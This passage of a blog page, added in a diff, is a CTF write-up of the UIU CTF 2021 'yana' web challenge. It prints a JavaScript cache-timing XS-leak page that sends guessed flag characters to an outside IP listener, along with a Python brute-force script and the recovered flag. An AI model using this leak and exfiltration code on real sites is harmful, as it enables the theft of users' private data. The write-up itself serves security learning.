class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Now, let’s check the loading time when sending the query included in the note.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128592823-ca4e045c-bf08-4743-899b-d6d51db68f19.png" alt="image"></p>
+<p>OMG When sending the included query, it took about 3s?3ms?!!</p>
+<p>Now let’s use this to brute force. However, when doing brute force, sending many requests at once can cause bot.js to close.</p>
+<p>I got one letter and proceeded with a new run.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> image = <span class="string">&quot;https://sigpwny.com/uiuctf/y.png&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> requestbin = <span class="string">&quot;//141.164.52.207:9999/flag&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> flag = location.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">`https://chal.yana.wtf/#<span class="subst">$&#123;flag&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(image).<span class="title function_">then</span>(<span class="function"><span class="params">d</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            end = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> ((end-start) &lt; <span class="number">8</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                location.<span class="title function_">replace</span>(requestbin + <span class="string">`?flag=<span class="subst">$&#123;flag&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//&#125;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">bot_url = <span class="string">&quot;yana-bot.chal.uiuc.tf&quot;</span></span><br><span class="line">bot_port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">condition = <span class="literal">True</span></span><br><span class="line"><span class="comment">#FLAG = b&quot;uiuctf&#123;&quot;</span></span><br><span class="line"><span class="comment">#FLAG = b&quot;uiuctf&#123;y&quot;</span></span><br><span class="line"><span class="comment">#FLAG = b&quot;uiuctf&#123;y0&quot;</span></span><br><span class="line"><span class="comment"># (...)</span></span><br><span class="line"><span class="comment">#FLAG = b&quot;uiuctf&#123;y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo&quot;</span></span><br><span class="line"><span class="comment">#FLAG = b&quot;uiuctf&#123;y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0&quot;</span></span><br><span class="line"><span class="comment">#FLAG = b&quot;uiuctf&#123;y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0k&quot;</span></span><br><span class="line"><span class="comment">#FLAG = b&quot;uiuctf&#123;y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0ku&quot;</span></span><br><span class="line">FLAG = <span class="string">b&quot;uiuctf&#123;y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup&quot;</span></span><br><span class="line"></span><br><span class="line">poc_url = <span class="string">b&quot;http://141.164.52.207/xsleak/exploit.html?a=&quot;</span></span><br><span class="line">char_list = <span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#125;&#123;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">global</span> FLAG, condition</span><br><span class="line">    FLAG = request.args.get(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    condition = <span class="literal">False</span></span><br><span class="line">    log.info(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&#x27;The flag is : <span class="subst">&#123;FLAG&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_bot</span>():</span><br><span class="line">    <span class="keyword">global</span> condition</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> char_list:</span><br><span class="line">        <span class="keyword">if</span> condition:</span><br><span class="line">            bot = remote(bot_url, bot_port, level=<span class="string">&#x27;error&#x27;</span> )</span><br><span class="line">            url = poc_url + FLAG + char.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#log.info(f&#x27;Send url : &#123;url&#125;&#x27;)</span></span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            bot.sendlineafter(<span class="string">b&#x27;Please send me a URL to open.\n&#x27;</span>, url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask</span>():</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = Thread(target=run_flask)</span><br><span class="line">    t2 = Thread(target=send_bot)</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure>
+<p>The exploit code is as above. So I’ll execute an exploit code!</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128597089-6d2f7f9e-b188-4b1e-9ea6-5bd63553a072.png" alt="image"></p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128597208-416e8fdc-9e0d-471d-93df-0fb40b353f8f.png" alt="image"></p>
+<p>(skip..)</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/128597345-a635ec41-3e60-4fa2-b77c-658cacf3104d.png" alt="image"></p>
+<p>Success! I got the flag :) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : uiuctf&#123;y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-cache-probing"><span class="toc-number">2.</span> <span class="toc-text">What is cache probing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Web-UIU-CTF-2021-yana-342-pts"><span class="toc-number">3.</span> <span class="toc-text">Exploit (Web) UIU CTF 2021 - yana [342 pts]</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&text=UIU CTF 2021 yana Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&is_video=false&description=UIU CTF 2021 yana Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=UIU CTF 2021 yana Write Up&body=Check out this article: https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&title=UIU CTF 2021 yana Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&name=UIU CTF 2021 yana Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.pocas.kr/2021/08/04/2021-08-04-UIU-CTF/&t=UIU CTF 2021 yana Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    POCAS
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
